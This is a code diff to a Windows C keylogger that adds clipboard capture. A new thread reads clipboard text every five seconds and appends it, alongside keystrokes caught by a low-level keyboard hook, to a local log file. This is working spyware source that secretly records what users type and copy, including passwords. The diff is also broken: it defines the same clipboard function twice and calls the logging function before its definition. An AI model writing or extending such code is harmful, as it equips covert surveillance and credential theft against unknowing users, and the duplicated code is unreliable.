@@ -4,6 +4,34 @@
 
 #define LOG_FILE "C:\\Users\\jareste\\Desktop\\keylog.txt"
 
+void LogClipboardContent(void)
+{
+    if (OpenClipboard(NULL))
+    {
+        HANDLE hData = GetClipboardData(CF_TEXT);
+        if (hData)
+        {
+            char* clipboardText = (char*)GlobalLock(hData);
+            if (clipboardText)
+            {
+                LogKeystroke(clipboardText);
+                GlobalUnlock(hData);
+            }
+        }
+        CloseClipboard();
+    }
+}
+
+DWORD WINAPI ClipboardLoggerThread(LPVOID lpParam)
+{
+    while (1)
+    {
+        LogClipboardContent();
+        Sleep(5000);
+    }
+    return 0;
+}
+
 void LogKeystroke(char* keystroke)
 {
     FILE* file = fopen(LOG_FILE, "a");
@@ -48,6 +76,24 @@ void LogKeyPress(DWORD vkCode)
     }
 }
 
+void LogClipboardContent(void)
+{
+    if (OpenClipboard(NULL))
+    {
+        HANDLE hData = GetClipboardData(CF_TEXT);
+        if (hData)
+        {
+            char* clipboardText = (char*)GlobalLock(hData);
+            if (clipboardText)
+            {
+                LogKeystroke(clipboardText);
+                GlobalUnlock(hData);
+            }
+        }
+        CloseClipboard();
+    }
+}
+
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
     if (nCode == HC_ACTION)
@@ -58,11 +104,14 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
             LogKeyPress(pKeyBoard->vkCode);
         }
     }
+    LogClipboardContent();
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
 int main(void)
 {
+    HANDLE hClipboardThread = CreateThread(NULL, 0, ClipboardLoggerThread, NULL, 0, NULL);
+
     HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
     if (!hHook)
     {
@@ -78,5 +127,6 @@ int main(void)
     }
 
     UnhookWindowsHookEx(hHook);
+    CloseHandle(hClipboardThread);
     return 0;
 }
